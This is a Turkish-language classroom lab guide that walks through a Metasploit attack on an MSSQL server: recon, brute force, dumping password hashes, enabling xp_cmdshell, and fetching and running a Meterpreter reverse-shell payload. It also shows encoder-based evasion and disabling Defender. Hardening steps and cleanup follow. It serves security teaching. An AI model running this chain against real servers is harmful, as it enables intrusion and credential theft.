# MSSQL Recon & Shell — Metasploit Lab

**Ortam:** Kali (`155.223.166.101`) → MSSQL (`155.223.166.100:51433`)  
**Hedef:** MSSQL keşif → yetki sömürüsü → shell → savunma  
**Süre:** ~40 dakika

---

## Hazırlık — Sysadmin Yetkisi Ver (SSMS'te)

> Lab başlamadan önce egeogr030'a geçici sysadmin yetkisi ver.

```sql
ALTER SERVER ROLE sysadmin ADD MEMBER [egeogr030];
```

Doğrula:
```sql
SELECT IS_SRVROLEMEMBER('sysadmin', 'egeogr030');
-- 1 dönmeli
```

---

## AŞAMA 1 — Keşif (Recon)

### 1a. Nmap ile Port Tarama

**Ekran: Kali terminal**

```bash
# MSSQL portunu tespit et
nmap -sV -p 1433,51433 155.223.166.100

# Tüm açık portları tara
nmap -sV -sC 155.223.166.100
```

**Gözlemlenenler:**
- Port `51433/tcp open` → Microsoft SQL Server
- Versiyon bilgisi: SQL Server 20xx
- Hostname, domain bilgisi

---

### 1b. Metasploit — MSSQL Instance Keşfi

```bash
msfconsole
```

```
use auxiliary/scanner/mssql/mssql_ping
set RHOSTS 155.223.166.100
set RPORT 51433
run
```

**Çıktıda görünenler:**
- SQL Server versiyonu
- Instance adı
- TCP portu
- Named pipe bilgisi
- Clustered mi değil mi

> "Hedef hakkında saldırı başlamadan bilgi toplandı. Güvenlik duvarı açık olan her port potansiyel bilgi sızıntısıdır."

---

### 1c. Metasploit — Brute Force (Hydra alternatifi)

```
use auxiliary/scanner/mssql/mssql_login
set RHOSTS 155.223.166.100
set RPORT 51433
set USERNAME egeogr030
set PASS_FILE /usr/share/wordlists/rockyou.txt
set VERBOSE false
set STOP_ON_SUCCESS true
run
```

> "Hydra ile HTTP üzerinden yaptığımızın aynısı, bu sefer doğrudan MSSQL protokolü üzerinden."

Parola bulununca:
```
[+] 155.223.166.100:51433 - Login Successful: egeogr030:egeogr030
```

---

### 1d. Metasploit — Veritabanı Enumerate

Credentials elde edildikten sonra:

```
use auxiliary/admin/mssql/mssql_enum
set RHOSTS 155.223.166.100
set RPORT 51433
set USERNAME egeogr030
set PASSWORD egeogr030
run
```

**Çıktıda görünenler:**
- SQL Server versiyonu ve patch seviyesi
- Authentication modu (Mixed / Windows)
- Tüm login hesapları ve rolleri
- Sysadmin olan hesaplar
- xp_cmdshell durumu (enabled/disabled)
- Linked server'lar
- Database listesi

> "Saldırgan artık sunucu hakkında tam bilgiye sahip:
> hangi hesaplar var, hangi yetkiler var, hangi özellikler açık."

---

### 1e. Metasploit — SQL Sorgusu Çalıştır

```
use auxiliary/admin/mssql/mssql_sql
set RHOSTS 155.223.166.100
set RPORT 51433
set USERNAME egeogr030
set PASSWORD egeogr030
set SQL SELECT name FROM sys.databases
run
```

Başka sorgular:
```
set SQL SELECT name, password_hash FROM sys.sql_logins
run

set SQL SELECT * FROM EGELAB.dbo.SUGGESTION
run
```

> "Veritabanındaki tüm verilere erişim sağlandı. Tablolar okunuyor, hash'ler çekiliyor."

---

## AŞAMA 2 — Sömürü (Exploitation)

### 2a. xp_cmdshell Nedir?

> "xp_cmdshell, SQL Server üzerinden işletim sistemi komutu çalıştırmaya izin veren
> bir stored procedure. Sysadmin yetkisiyle etkinleştirilebilir.
> Etkinleştirildiğinde MSSQL'den direkt Windows komutlarına erişim sağlanır."

Varsayılan durum: **kapalı**

```sql
-- Şu an açık mı?
EXEC sp_configure 'xp_cmdshell';
-- run_value = 0 ise kapalı
```

---

### 2b. xp_cmdshell Etkinleştir

```
use auxiliary/admin/mssql/mssql_sql
set SQL EXEC sp_configure 'show advanced options', 1; RECONFIGURE
run

set SQL EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE
run
```

veya SSMS'te:
```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

---

### 2c. xp_cmdshell ile OS Komutu Çalıştır

```
use auxiliary/admin/mssql/mssql_exec
set RHOSTS 155.223.166.100
set RPORT 51433
set USERNAME egeogr030
set PASSWORD egeogr030
set CMD whoami
run
```

**Çıktı:**
```
nt service\mssqlserver
```

Başka komutlar:
```
set CMD hostname
run

set CMD ipconfig
run

set CMD net user
run

set CMD dir C:\
run
```

> "MSSQL servisi üzerinden Windows komutları çalışıyor.
> Sunucunun kullanıcı listesi, ağ yapısı, dosya sistemi görünür hale geldi."

---

### 2d. Meterpreter Shell Aç

> "Şimdi xp_cmdshell'i kullanarak Meterpreter reverse shell açacağız.
> Saldırgan MSSQL üzerinden Windows'un tam kontrolünü alıyor."

**Kali'de listener hazırla (yeni terminal):**
```bash
msfconsole
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 155.223.166.101
set LPORT 4444
run
```

**Payload oluştur:**
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=155.223.166.101 LPORT=4444 \
  -f exe -o /tmp/shell.exe
```

**Python ile HTTP server başlat:**
```bash
cd /tmp
python3 -m http.server 8080
```

**mssql_exec ile payload'ı indir ve çalıştır:**
```
use auxiliary/admin/mssql/mssql_exec
set CMD powershell -c "Invoke-WebRequest http://155.223.166.101:8080/shell.exe -OutFile C:\Windows\Temp\shell.exe"
run

set CMD C:\Windows\Temp\shell.exe
run
```

**Listener'da Meterpreter oturumu açılır:**
```
[*] Meterpreter session 1 opened
meterpreter > getuid
Server username: NT SERVICE\MSSQLSERVER
meterpreter > sysinfo
meterpreter > hashdump
```

> "MSSQL'den tam Windows shell'e geçtik. Artık sunucuda istediğimizi yapabiliriz."

---

### 2e. MSSQL'den MSSQL'e — Audit'te Ne Görünür?

**Ekran: SSMS — Audit log**

```sql
SELECT event_time, server_principal_name, client_ip, statement
FROM sys.fn_get_audit_file('C:\AuditLogs\*.sqlaudit', DEFAULT, DEFAULT)
ORDER BY event_time DESC;
```

> "Audit'te ne görünüyor? client_ip = 155.223.166.101 (Kali).
> Ama Meterpreter açıldıktan sonra shell üzerinden yapılan işlemler
> artık Windows process'i olarak çalışır — MSSQL audit bunları görmez.
> Bu yüzden sadece DB audit yetmez."

---

## AŞAMA 3 — Savunma

### 3a. xp_cmdshell Kapat

> "xp_cmdshell'i kapatmak bu saldırı vektörünü tamamen ortadan kaldırır."

```sql
EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;
EXEC sp_configure 'show advanced options', 0; RECONFIGURE;
```

Doğrula:
```sql
EXEC sp_configure 'xp_cmdshell';
-- run_value = 0 olmalı
```

**Test:** mssql_exec ile tekrar dene → `xp_cmdshell disabled` hatası alınır.

---

### 3b. Sysadmin Yetkisini Kaldır

> "Least privilege — her hesap sadece ihtiyacı olan yetkiye sahip olmalı."

```sql
ALTER SERVER ROLE sysadmin DROP MEMBER [egeogr030];
```

Doğrula:
```sql
SELECT IS_SRVROLEMEMBER('sysadmin', 'egeogr030');
-- 0 dönmeli
```

**Test:** mssql_enum çalıştır → sysadmin listesinde artık yok.

---

### 3c. Surface Area Küçültme

```sql
-- Gereksiz özellikleri kapat
EXEC sp_configure 'Ole Automation Procedures', 0; RECONFIGURE;
EXEC sp_configure 'clr enabled', 0; RECONFIGURE;
EXEC sp_configure 'remote admin connections', 0; RECONFIGURE;

-- Bilgi sızıntısını azalt
-- (Hata mesajlarında versiyon bilgisi görünmesin)
EXEC sp_configure 'hide instance', 1; RECONFIGURE;
```

---

### 3d. Savunma Özeti — Hangi Adım Neyi Engeller

| Saldırı | Engelleme |
|---------|-----------|
| mssql_login brute force | CHECK_POLICY + LOGON Trigger (IP whitelist) |
| mssql_enum bilgi toplama | hide instance + firewall IP kısıtı |
| mssql_sql veri okuma | Least privilege (sadece gerekli tablolara SELECT) |
| xp_cmdshell OS komutu | xp_cmdshell = 0 (kapalı tut) |
| Meterpreter shell | xp_cmdshell kapalı + EDR + Windows Defender |
| Tüm vektörler | Firewall → sadece uygulama sunucusuna 51433 izni |

---

## Temizlik

```sql
-- Sysadmin yetkisini geri al
ALTER SERVER ROLE sysadmin DROP MEMBER [egeogr030];

-- xp_cmdshell kapalı olduğunu doğrula
EXEC sp_configure 'xp_cmdshell';
```

```bash
# Kali'de payload ve listener'ı temizle
rm /tmp/shell.exe
```

---

## Öğrenci Notları

```
Recon araçları:          nmap, mssql_ping, mssql_enum
Brute force:             mssql_login, hydra
Veri erişimi:            mssql_sql
Komut çalıştırma:        mssql_exec (xp_cmdshell gerekir)
Shell:                   msfvenom + reverse_tcp + mssql_exec
Savunma:                 xp_cmdshell=0, least privilege, firewall, IP whitelist
```

---

## Olası Sorunlar ve Çözümler

### Windows Defender payload'ı silerse

```bash
# Encoded payload kullan
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=155.223.166.101 LPORT=4444 \
  -e x64/xor_dynamic -f exe -o /tmp/shell.exe
```

Hala siliniyorsa Windows'ta Defender'ı geçici kapat:
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
# Lab sonrası tekrar aç:
Set-MpPreference -DisableRealtimeMonitoring $false
```

---

### Payload indirilirken port 8080 bloke olursa

```powershell
New-NetFirewallRule -DisplayName "Lab HTTP 8080" `
  -Direction Inbound -Protocol TCP -LocalPort 8080 -Action Allow
```

Lab sonrası kaldır:
```powershell
Remove-NetFirewallRule -DisplayName "Lab HTTP 8080"
```

---

### Metasploit modüllerinde RPORT unutulursa

Non-default port (51433) — her modülde mutlaka ayarla:
```
set RPORT 51433
```

`mssql_ping` hariç diğer tüm modüllerde gerekli.

---

### Hangi adımlar sorunsuz çalışır

| Adım | Risk |
|------|------|
| nmap | Sorunsuz |
| mssql_ping | Sorunsuz |
| mssql_login | Sorunsuz |
| mssql_sql | Sorunsuz |
| mssql_enum | Sorunsuz |
| mssql_exec (komut) | Sorunsuz |
| Meterpreter shell | Defender müdahale edebilir |

*Yalnızca yetkili lab ortamında kullanın.*
